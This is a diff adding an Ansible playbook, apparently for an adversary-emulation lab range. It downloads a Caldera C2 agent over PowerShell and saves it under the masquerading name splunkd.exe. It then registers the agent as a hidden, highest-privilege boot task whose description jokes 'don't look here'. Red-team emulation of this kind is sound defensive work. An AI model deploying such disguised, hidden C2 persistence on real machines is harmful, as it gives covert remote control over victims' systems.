@@ -1,0 +1,39 @@
+---
+- name: Install Windows Agent [Caldera Agent]
+  ansible.windows.win_powershell:
+    parameters:
+      server: "http://{{ caldera_server.private_ip }}:8888"
+    script: |
+      param (
+        [String]$server
+      )
+
+      $url="$server/file/download";
+      $wc=New-Object System.Net.WebClient;
+      $wc.Headers.add("platform","windows");
+      $wc.Headers.add("file","sandcat.go");
+      $data=$wc.DownloadData($url);
+      get-process | ? {$_.modules.filename -like "C:\Temp\splunkd.exe"} | stop-process -f;
+      rm -force "C:\Temp\splunkd.exe" -ea ignore;
+      [io.file]::WriteAllBytes("C:\Temp\splunkd.exe",$data) | Out-Null;
+
+- name: Set scheduled task [Caldera Agent]
+  community.windows.win_scheduled_task:
+    name: CalderaAgent
+    description: Connects to caldera C2 server - don't look here xD
+    actions:
+      - path: C:\Temp\splunkd.exe
+        arguments: -server http://{{ caldera_server.private_ip }}:8888 -group red
+    triggers:
+      - type: boot
+    username: "Administrator"
+    password: "{{ general.attack_range_password }}"
+    run_level: highest
+    hidden: true
+    state: present
+    enabled: true
+    allow_demand_start: true
+    logon_type: password
+
+- name: Start agent [Caldera Agent]
+  ansible.windows.win_command: SCHTASKS.EXE /RUN /I /TN CalderaAgent
